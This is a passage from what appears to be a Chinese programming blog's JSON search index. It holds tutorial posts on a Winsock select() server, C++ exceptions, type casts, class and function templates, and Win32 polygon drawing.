if (readAllSocket.fd_array[i] == serverSocket) &#123; sockaddr_in clientAddr = &#123; 0 &#125;; int addrLen = sizeof(clientAddr); SOCKET clientSocket = accept(serverSocket,(sockaddr *)&amp;clientAddr,&amp;addrLen); if (clientSocket == INVALID_SOCKET) &#123; cout &lt;&lt; \"accept Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; continue; &#125; if (allSocket.fd_count == FD_SETSIZE) &#123; cout &lt;&lt; \"服务器已满\" &lt;&lt; endl; send(clientSocket, \"服务器爆满,请稍后连接...\", sizeof(\"服务器爆满,请稍后连接...\\n\"), 0); closesocket(clientSocket); continue; &#125; cout &lt;&lt; \"连接服务器成功 : \" &lt;&lt; inet_ntoa(clientAddr.sin_addr) &lt;&lt; endl; int sendRes = send(clientSocket, \"连接成功...\", sizeof(\"连接成功...\") + 1,0); FD_SET(clientSocket, &amp;allSocket); &#125; //收消息 else &#123; char recBuf[1500] = &#123; 0 &#125;; int recvRes = recv(readAllSocket.fd_array[i], recBuf, sizeof(recBuf), 0); if (recvRes == SOCKET_ERROR) &#123; int WSAError = WSAGetLastError(); cout &lt;&lt; \"recv Error: \" &lt;&lt; WSAError &lt;&lt; endl; if (WSAError == 10054) &#123; cout &lt;&lt; \"客户端强制下线了\" &lt;&lt; endl; FD_CLR(readAllSocket.fd_array[i],&amp;allSocket); continue; &#125; &#125; else if (recvRes == 0) &#123; cout &lt;&lt; \"客户端下线了\" &lt;&lt; endl; FD_CLR(readAllSocket.fd_array[i], &amp;allSocket); continue; &#125; else &#123; cout &lt;&lt; recBuf &lt;&lt; endl; &#125; &#125; &#125;//for readAllsocket //处理异常错误 for (u_int i = 0; i &lt; exAllSocket.fd_count; i++) &#123; char exBuf[1024] = &#123; 0 &#125;; int exLen = 1024; getsockopt(exAllSocket.fd_array[i], SOL_SOCKET, SO_ERROR, exBuf, &amp;exLen); cout &lt;&lt;\"异常错误: \" &lt;&lt; exBuf&lt;&lt; endl; &#125;// for exAllSocket &#125;//else if 有消息 //select出错了 else &#123; cout &lt;&lt; \"select Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; &#125; &#125;//while(true) for (u_int i = 0; i &lt; allSocket.fd_count; i++) &#123; closesocket(allSocket.fd_array[i]); &#125; closesocket(serverSocket); WSACleanup(); return 0;&#125;","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"异常类型和异常变量的生命周期","slug":"cpp0073-异常类型和异常变量的生命周期","date":"2021-06-20T00:14:35.000Z","updated":"2021-12-28T18:39:19.878Z","comments":true,"path":"2021/06/20/cpp0073-异常类型和异常变量的生命周期/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0073-异常类型和异常变量的生命周期/","excerpt":"","text":"异常类型和异常变量的生命周期 throw的异常是有类型的，可以使，数字、字符串、类对象。 throw的异常是有类型的，catch严格按照类型进行匹配。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class MyException &#123;public: MyException()&#123;&#125; //有参构造 MyException(const char * str)&#123; mStr = new char[strlen(str) + 1]; strcpy(mStr,str); &#125; //拷贝构造 MyException(const MyException &amp; mE) &#123; this -&gt; mStr = new char[strlen(mE.mStr) + 1]; strcpy(this-&gt;mStr,mE.mStr); &#125; void what() &#123; cout &lt;&lt; mStr &lt;&lt; endl; &#125; ~MyException() &#123; if (mStr != NULL) &#123; delete[] mStr; &#125; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;private: char * mStr;&#125;;void test01() &#123; //创建一个匿名对象 throw MyException(\"未知异常\");&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (MyException mE) &#123; mE.what(); &#125; return 0;&#125; throw抛出去的如果是普通类型或者引用变量,它的生命周期是在catch结束后释放掉 如果throw抛出去的是一个指针,那么在进入catch前被释放掉 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class MyException &#123;public: MyException()&#123;&#125; //有参构造 MyException(const char * str)&#123; cout &lt;&lt; \"对象构造\" &lt;&lt; endl; mStr = new char[strlen(str) + 1]; strcpy(mStr,str); &#125; //拷贝构造 MyException(const MyException &amp; mE) &#123; this -&gt; mStr = new char[strlen(mE.mStr) + 1]; strcpy(this-&gt;mStr,mE.mStr); &#125; void what() &#123; cout &lt;&lt; mStr &lt;&lt; endl; &#125; ~MyException() &#123; if (mStr != NULL) &#123; delete[] mStr; &#125; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;private: char * mStr;&#125;;void test01() &#123; //创建一个匿名对象,如果抛出的是指针,会在进入catch前就释放掉该指针 cout &lt;&lt; \"&amp;(MyException(未知异常))\" &lt;&lt; endl; throw &amp;(MyException(\"未知异常\"));&#125;void test02() &#123; //创建一个匿名对象,抛出一个普通对象,用引用去接 cout &lt;&lt; \"MyException(未知异常)\" &lt;&lt; endl; throw MyException(\"未知异常\");&#125;void test03() &#123; //创建一个匿名对象,抛出一个普通对象 cout &lt;&lt; \"MyException(未知异常) 用普通对象来接\" &lt;&lt; endl; throw MyException(\"未知异常\");&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (MyException * mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; cout &lt;&lt; \"=================================\" &lt;&lt; endl; try &#123; test02(); &#125; catch (MyException &amp; mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; cout &lt;&lt; \"=================================\" &lt;&lt; endl; try &#123; test03(); &#125; catch (MyException mE) &#123; cout &lt;&lt; \"未知异常\" &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"异常接口声明","slug":"cpp0072-异常接口声明","date":"2021-06-19T23:55:35.000Z","updated":"2021-12-28T18:39:16.495Z","comments":true,"path":"2021/06/20/cpp0072-异常接口声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0072-异常接口声明/","excerpt":"","text":"异常接口声明 为了加强程序的可读性，可以在函数声明中列出可能抛出的所有异常类 型，例如： void func() throw (A, B, C , D);这个函数func（）能够且只能抛出类 型A B C D及其子类型的异常。 如果在函数声明中没有包含异常接口声明，则次函数可以抛掷任何类型的 异常，例如： void func(); 一个不抛掷任何类型异常的函数可以声明为： void func() throw(); 如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexpected 函数会被调用，该函数默认行为调用terminate函数中止程序。 12345678910111213141516171819202122232425262728293031323334353637383940#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;//只能抛出int,double,char这三个类型的异常//在VS中可能抛出其他类型的异常不会出错,但在Linux会报错const char * gStr = \"abc\";void test01()throw(int,double,char) &#123; throw gStr;&#125;//不能抛出异常void test02()throw() &#123;&#125;//可以抛出所有类型的异常void test03() &#123;&#125;int main(char *argv[], int argc)&#123; try &#123; test01(); &#125; catch (int) &#123; &#125; catch (const char * y) &#123; cout &lt;&lt; y &lt;&lt; endl; &#125; catch (double) &#123; &#125; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"栈解旋","slug":"cpp0071-栈解旋","date":"2021-06-19T23:33:40.000Z","updated":"2021-12-28T18:39:12.875Z","comments":true,"path":"2021/06/20/cpp0071-栈解旋/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0071-栈解旋/","excerpt":"","text":"栈解旋 异常被抛出后，从进入try块起，到异常被抛掷前，这期间在栈上的构造的 所有对象，都会被自动析构。析构的顺序与构造的顺序相反。这一过程称为栈 的解旋(unwinding)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Person &#123;public: Person() &#123; cout &lt;&lt; \"对象构造\" &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; \"对象析构\" &lt;&lt; endl; &#125;&#125;;double dev(double x, double y) &#123; Person p1, p2; if (y == 0) &#123; throw y; &#125; return x / y;&#125;void test01() &#123; dev(10,0);&#125;void test02() &#123; try &#123; test01(); &#125; catch (double y) //异常是根据类型进行匹配的 可以是catch (double)不接收异常的值 &#123; cout &lt;&lt; \"除数为: \" &lt;&lt; y &lt;&lt; endl; &#125;&#125;int main(char *argv[], int argc)&#123; test02(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"异常基本语法","slug":"cpp0070-异常基本语法","date":"2021-06-19T23:26:16.000Z","updated":"2021-12-28T18:39:06.553Z","comments":true,"path":"2021/06/20/cpp0070-异常基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0070-异常基本语法/","excerpt":"","text":"异常基本语法 如果抛出异常后,不处理异常,程序会自动结束 异常是一层层向上抛出的,直到处理异常为止,如果抛到顶层还没有处理,程序自动结束. c++的异常是必须处理的 12345678910//抛异常throw 变量/对象/值/指针 try&#123; //可能会出现异常的语句块&#125;catch(类型/类型 变量名)&#123; //处理异常&#125; 1234567891011121314151617181920212223242526272829303132333435#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;double dev(double x, double y) &#123; if (y == 0) &#123; throw y; //抛异常 &#125; return x / y;&#125;void test01() &#123; dev(10,0);&#125;void test02() &#123; try &#123; //可能会出现异常 test01(); &#125; catch (double y) //异常是根据类型进行匹配的 可以是catch (double)不接收异常的值 &#123; cout &lt;&lt; y &lt;&lt; endl; &#125;&#125;int main(char *argv[], int argc)&#123; test02(); cout &lt;&lt; 123 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类型转换","slug":"cpp0069-类型转换","date":"2021-06-19T21:52:15.000Z","updated":"2021-12-28T18:39:03.663Z","comments":true,"path":"2021/06/20/cpp0069-类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/20/cpp0069-类型转换/","excerpt":"","text":"类型转换 C++提供了4种类型转换，分别处理不同的场合应用 static_cast 静态类型转换。 可以转换基本数据类型和具有继承关系的对象指针或引用 static_cast&lt;目标类型&gt; (标识符) reinterpret_cast重新解释类型转换。 仅仅重新解释类型，但没有进行二进制的转换： 1. 转换的类型必须是一个指针、引用、算术类型、函数指针或者成员指针。 2. 在比特位级别上进行转换。它可以把一个指针转换成一个整数，也可以把一个整数转换成一个指针(先把一个指针转换成一个整数，在把该整数转换成原类型的指针，还可以得到原先的指针值)。但不能将非32bit的实例转成指针。 3. 最普通的用途就是在函数指针类型之间进行转换。 4. 很难保证移植性。 12345678910111213141516#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;typedef void(*VFun)(int, int);typedef double(*DFun)(int, int);int main(char *argv[], int argc)&#123; VFun vf = NULL; DFun df = reinterpret_cast&lt;DFun&gt;(vf); return 0;&#125; dynamic_cast 子类和父类之间的多态类型转换。 dynamic_cast&lt;目标类型&gt; (标识符) 只能转换具有继承关系的指针或引用,会做类型安全检查 只能从子类转父类,因为一般子类内存空间是大于等于父类的,如果子类内存空间大于父类，把父类指针转换成子类指针,会越界处理，所以不安全。 如果转换失败返回NULL 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Base &#123;private: char * mName;&#125;;class Son : public Base &#123;private: int age;&#125;;class Animal &#123; char * mName;&#125;;int main(char *argv[], int argc)&#123; Base * pBase = NULL; Son * pSon = NULL; Animal * pAnimal = NULL; //pSon = dynamic_cast&lt;Son *&gt;(pBase); 父类指针不能装子类指针 //pSon = dynamic_cast&lt;Son *&gt;(pAnimal); 不具有继承关系的不能转换 pBase = dynamic_cast&lt;Son *&gt;(pSon); //子类转父类可以 return 0;&#125; const_cast 去掉const属性转换。 const_cast&lt;目标类型&gt;(标识符) 目标类类型只能是指针或引用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Base &#123;private: char * mName;&#125;;class Son : public Base &#123;private: int age;&#125;;class Animal &#123; char * mName;&#125;;void test() &#123; //基本数据类型 int a = 10; const int &amp; b = a; int &amp;c = const_cast&lt;int &amp;&gt;(b); c = 20; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl;&#125;void test02() &#123; Base * a = NULL; const Base *b = a; Base * c = const_cast&lt;Base *&gt;(b); c = new(Base); cout &lt;&lt; \"===========================\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl; delete c; c = NULL;&#125;int main(char *argv[], int argc)&#123; //基础数据类型 test(); //对象数据类型 test02(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板中的static成员","slug":"cpp0068-类模板中的static成员","date":"2021-06-18T23:33:17.000Z","updated":"2021-12-28T18:39:00.086Z","comments":true,"path":"2021/06/19/cpp0068-类模板中的static成员/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0068-类模板中的static成员/","excerpt":"","text":"类模板中的static成员 类模板中的static成员单独属于每一个实例化出来的类 也就是说每个具体化类的static成员都是不一样的,没有关联的 例如有一个模板类A中有一个static成员 类A&lt;int&gt;和类A&lt;double&gt;都有自己的static成员,他们两个的static成员是不同且没有关联的 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class A&#123;public: T value; static T a;&#125;;template &lt;class T&gt;T A&lt;T&gt;::a = 0;//类中的静态成员需要在类的外部进行初始化。int main(void)&#123; //1 模板类通过二次编译根据调用的代码生成了两个不同的类A 一个是A&lt;int&gt; 一个A&lt;char&gt; A&lt;int&gt; a1, a2, a3; A&lt;char&gt; b1, b2, b3; A&lt;int&gt;::a = 20; //改变A&lt;int&gt;的静态成员 A&lt;char&gt;::a = 'X';//改变A&lt;char&gt;的静态成员 cout &lt;&lt; \"a1:a = \" &lt;&lt; a1.a &lt;&lt; endl; //20 cout &lt;&lt; \"b1:a = \" &lt;&lt; b1.a &lt;&lt; endl;//'X' cout &lt;&lt; \"a2:a = \" &lt;&lt; a2.a &lt;&lt; endl; cout &lt;&lt; \"a3:a = \" &lt;&lt; a3.a &lt;&lt; endl; cout &lt;&lt; \"b2:a= \" &lt;&lt; b2.a &lt;&lt; endl;//'X' cout &lt;&lt; \"b3:a = \" &lt;&lt; b3.a &lt;&lt; endl;//'X' return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板的多文件编写","slug":"cpp0067-类模板的多文件编写","date":"2021-06-18T23:18:48.000Z","updated":"2021-12-28T18:38:56.041Z","comments":true,"path":"2021/06/19/cpp0067-类模板的多文件编写/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0067-类模板的多文件编写/","excerpt":"","text":"类模板的多文件编写 不建议类模板分多文件编写 如果多文件编写类模板,在调用实例化模板类要包含cpp实现 一般的类模板实现文件后缀名是hpp 如果不包含类实现,在调用具体化模板类时,因为编译器是逐个文件进行编译的，所以编译器在当前文件找不到类实现，会认为类实现在其他文件,然后编译器会自动跳过,交给链接器处理,而链接器又找不到具体化函数,就会报错 h头文件 1234567891011121314151617181920212223#pragma once#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class Complex&#123;public: Complex(); ~Complex(); Complex(T a, T b); void pirntComplex(); Complex operator+(Complex &amp;another); Complex operator-(Complex &amp;another);private: T a; T b;&#125;; hpp文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include \"Complext.h\"//最终通过第二次编译生成class Complex&lt;int&gt; 是在cpp文件中展开/*class Complex&lt;int&gt; &#123;&#125;*/template&lt;class T&gt;Complex&lt;T&gt;::Complex()&#123; this-&gt;a = 0; this-&gt;b = 0;&#125;template&lt;class T&gt;Complex&lt;T&gt;::~Complex()&#123;&#125;template&lt;class T&gt;Complex&lt;T&gt;::Complex(T a, T b)&#123; this-&gt;a = a; this-&gt;b = b;&#125;template&lt;class T&gt;void Complex&lt;T&gt;::pirntComplex()&#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl;&#125;template&lt;class T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt; &amp;another)&#123; Complex temp(this-&gt;a + another.a, this-&gt;b + another.b); return temp;&#125;template&lt;class T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator-(Complex&lt;T&gt; &amp;another)&#123; Complex temp(this-&gt;a - another.a, this-&gt;b - another.b); return temp;&#125; 12345678910111213141516171819202122232425262728#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include \"Complext.h\"#include \"Complext.hpp\" //不能够引入cpp#include &lt;vector&gt;//模板类的 方法的实现不能够用多文件编写。//如果实现多文件的 由于二次编译 真正的实现体是在cpp文件定义的。需要引入cpp头文件。using namespace std;int main(void)&#123; Complex&lt;int&gt; c1(10, 20); c1.pirntComplex(); Complex&lt;int&gt; c2(1, 2); Complex&lt;int&gt; c3; //调用无参构造 c3 = c1 + c2; c3.pirntComplex(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板的类外实现","slug":"cpp0066-类模板的类外实现","date":"2021-06-18T18:13:48.000Z","updated":"2021-12-28T18:38:52.753Z","comments":true,"path":"2021/06/19/cpp0066-类模板的类外实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0066-类模板的类外实现/","excerpt":"","text":"类模板的类外实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;//在类的外面声明一下友元模板函数template&lt;class T&gt;class Person;template&lt;class T&gt;void Show(Person&lt;T&gt; &amp;p);template&lt;class T&gt;ostream &amp; operator&lt;&lt; (ostream &amp; os, Person&lt;T&gt; &amp;p);template&lt;class T&gt;class Person &#123;public: Person(); Person(T name); friend ostream &amp; operator&lt;&lt; &lt;&gt; (ostream &amp; os, Person&lt;T&gt; &amp;p); Person&lt;T&gt; operator=(Person&lt;T&gt; &amp; tp); friend void Show&lt;&gt;(Person&lt;T&gt; &amp;p);private: T mName;&#125;;template&lt;class T&gt;void Show(Person&lt;T&gt; &amp;p) &#123; cout &lt;&lt; p.mName &lt;&lt; endl;&#125;template&lt;class T&gt;Person&lt;T&gt; Person&lt;T&gt;::operator=(Person&lt;T&gt; &amp; tp)&#123; this-&gt;mName = tp.mName; return *this;&#125;template&lt;class T&gt;ostream &amp; operator&lt;&lt; (ostream &amp; os, Person&lt;T&gt; &amp;p)&#123; os &lt;&lt; p.mName; return os;&#125;template&lt;class T&gt;Person&lt;T&gt;::Person()&#123;&#125;template&lt;class T&gt;Person&lt;T&gt;::Person(T name) &#123; mName = name;&#125;void test01() &#123; Person&lt;string&gt; p(\"小明\"); Person&lt;string&gt; p2(\"123\"); //p2 = p; //cout &lt;&lt; p2 &lt;&lt; endl; //cout &lt;&lt; p &lt;&lt; endl; Show(p); Show(p2);&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板的类内实现","slug":"cpp0065-类模板的类内实现","date":"2021-06-18T16:50:07.000Z","updated":"2021-12-28T18:38:46.965Z","comments":true,"path":"2021/06/19/cpp0065-类模板的类内实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/19/cpp0065-类模板的类内实现/","excerpt":"","text":"类模板的类内实现 1234567891011121314151617181920212223242526272829303132#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T1,class T2&gt;class Person &#123;private: T1 mName; T2 mAge;public: Person()&#123;&#125; Person(T1 name,T2 age):mName(name),mAge(age) &#123;&#125; void show() &#123; cout &lt;&lt; mName &lt;&lt; \":\" &lt;&lt; mAge &lt;&lt; \"岁\" &lt;&lt; endl; &#125;&#125;;void test01() &#123; Person&lt;string, int&gt; p(\"小明\",18); p.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板派生普通类与类模板派生类模板","slug":"cpp0064-类模板派生普通类与类模板派生类模板","date":"2021-06-18T15:47:47.000Z","updated":"2021-12-28T18:38:43.441Z","comments":true,"path":"2021/06/18/cpp0064-类模板派生普通类与类模板派生类模板/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0064-类模板派生普通类与类模板派生类模板/","excerpt":"","text":"类模板派生普通类 1234567891011121314151617181920212223242526272829303132333435363738#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;template&lt;class T&gt;class A &#123;public: T mA; A()&#123;&#125; A(T a):mA(a)&#123;&#125;&#125;;//模板类派生普通类//结论：子类从模板类继承的时候，需要让编译器知道父类的数据类型具体是什么（数据类型的本质：固定大小内存块的别名）A&lt;int&gt;class B : public A&lt;int&gt; &#123;public: void show() &#123; cout &lt;&lt; mA &lt;&lt; endl; &#125; B(int a):A(a)&#123;&#125;&#125;;void test01() &#123; B b(100); b.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; 类模板派生类模板 12345678910111213141516171819202122232425262728293031323334353637383940414243#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T&gt;class A &#123;public: T mA; A()&#123;&#125; A(T a)&#123; mA = a; &#125;&#125;;template&lt;class T&gt;class B : public A&lt;T&gt;&#123;public: B():A&lt;T&gt;()&#123;&#125; B(T a):A&lt;T&gt;(a)&#123;&#125; void show() &#123; //要显示的指明要调用哪个类实例的mA cout &lt;&lt; A&lt;T&gt;::mA &lt;&lt; endl; &#125;&#125;;void test01() &#123; B&lt;string&gt; b(\"wwww\"); cout &lt;&lt; b.mA &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类模板的基本语法","slug":"cpp0063-类模板的基本语法","date":"2021-06-18T15:07:46.000Z","updated":"2021-12-28T18:38:40.304Z","comments":true,"path":"2021/06/18/cpp0063-类模板的基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0063-类模板的基本语法/","excerpt":"","text":"类模板的基本语法 类模板必须显式指定类型 12345678910111213141516171819202122232425262728293031323334353637#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;template&lt;class T&gt;class Person &#123; private: T mA;public: Person()&#123;&#125; Person(T a) &#123; mA = a; &#125; void show() &#123; cout &lt;&lt; mA &lt;&lt; endl; &#125;&#125;;void test01() &#123; //类模板必须显示调用 Person&lt;string&gt; str(\"123\"); str.show();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"编译器对模板机制剖析","slug":"cpp0062-编译器对模板机制剖析","date":"2021-06-18T14:58:38.000Z","updated":"2021-12-28T18:38:37.484Z","comments":true,"path":"2021/06/18/cpp0062-编译器对模板机制剖析/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0062-编译器对模板机制剖析/","excerpt":"","text":"编译器对模板机制剖析 简析编译器的编译过程 123456g++ -E hello.c -o hello.i（预处理）g++ -S hello.i -o hello.s（编译）g++ -c hello.s -o hello.o（汇编）g++ hello.o -o hello（链接）以上四个步骤，可合成一个步骤g++ hello.c -o hello（直接编译链接成可执行目标文件） 编译器并不是把函数模板处理成能够处理任意类的函数 编译器从函数模板通过具体类型产生不同的函数 编译器会对函数模板进行两次编译,在声明的地方对模板代码本身进行编译； 在调用的地方对参数替换后的代码进行编译。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"函数模板基本语法","slug":"cpp0061-函数模板基本语法","date":"2021-06-18T14:29:13.000Z","updated":"2021-12-28T18:38:33.760Z","comments":true,"path":"2021/06/18/cpp0061-函数模板基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/18/cpp0061-函数模板基本语法/","excerpt":"","text":"函数模板基本语法 语法 12345template&lt;class T1,...,class Tn&gt; //template&lt;typename T&gt;void FunName(T1 x1,...,Tn xn)&#123; //函数体&#125; template是语义是模板的意思，尖括号中先写关键字typename或是 class，后面跟一个类型T，此类即是虚拟的类型。至于为什么用T用的人多了，也 就是T了。 函数模板,只适用于函数的参数个数相同而类型不同,且函数体相同的情况。 如 果个数不同,则不能用函数模板。 普通函数会进行隐式的数据类型转换, 函数模板不提供隐式的数据类型转 换 必须是严格的匹配。 当函数模板和普通函数都符合调⽤用时,优先选择普通函数 当函数模板和普通函数都符合调用时,优先选择普通函数 若显示使用函数模板,则使用&lt;&gt; 类型列表 如果 函数模板产生更好的匹配 使用函数模板 123456789101112131415161718192021222324252627282930#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;template&lt;class T&gt; //template&lt;typename T&gt;void MySwap(T &amp;a,T &amp;b) &#123; T temp = a; cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; endl; a = b; b = temp; cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; endl;&#125;void test01() &#123; int a = 1, b = 2; double da = 1.1, db = 2.2; //隐式调用模板函数 MySwap(a,b); //显示调用模板函数 MySwap&lt;double&gt;(da,db);&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int Max(int a, int b)&#123;cout &lt;&lt; \"int Max(int a, int b)\" &lt;&lt; endl;return a &gt; b ? a : b;&#125;template&lt;typename T&gt;T Max(T a, T b)&#123; cout &lt;&lt; \"T Max(T a, T b)\" &lt;&lt; endl; return a &gt; b ? a : b;&#125;template&lt;typename T&gt;T Max(T a, T b, T c)&#123; cout &lt;&lt; \"T Max(T a, T b, T c)\" &lt;&lt; endl; return Max(Max(a, b), c);&#125;int main()&#123; int a = 1; int b = 2; cout &lt;&lt; Max(a, b) &lt;&lt; endl; //当函数模板和普通函数都符合调用时,优先选择普通函数 cout &lt;&lt; Max&lt;&gt;(a, b) &lt;&lt; endl; //若显示使用函数模板,则使用 &gt;类型列表 cout &lt;&lt; Max(3.0, 4.0) &lt;&lt; endl; //如果函数模板产生更好的匹配使用函数模板 cout &lt;&lt; Max(5.0, 6.0, 7.0) &lt;&lt; endl; //重载 cout &lt;&lt; Max('a', 100) &lt;&lt; endl; //调用普通函数可以隐式类型转换 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"画图","slug":"pwcp017-画图","date":"2021-06-12T17:34:56.000Z","updated":"2021-06-12T19:04:18.313Z","comments":true,"path":"2021/06/13/pwcp017-画图/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/13/pwcp017-画图/","excerpt":"","text":"画图 多边形 1BOOL POLYGON(HDC HDC, CONST POINT *LPPOINTS, INT NCOUNT)； HDC：设备环境句柄。 LPPOINTS：指向用于指定多边形顶点的POINT结构数组的指针。LPPOINTS中坐标以当前位置为原点。 NCOUNT：指定数组中顶点个数，此值必须大于等于2。 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 多个多边形 1BOOL PolyPolygon(HDC hdc, CONST POINT *lpPoints, CONST INT *lpPolyCounts, int nCount)； 参数： hdc：设备环境句柄。 lpPoints：指向定义多边形顶点的POINT结构数组的指针，各多边形是连续定义的，每个多边形通过画一条从最后中一个顶点到第一个顶点的线段而自动闭合起来，每个顶点应被定义一次。 lpPolyCounts：指向整数数组的指针，每个整数指定相应多边表的点数，每个整数必须大于等于2。 nCount：指定多边形的总个数。 返回值：如果函数调用成功，返回值非零，否则返回值是0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209// 画图.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画图.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM 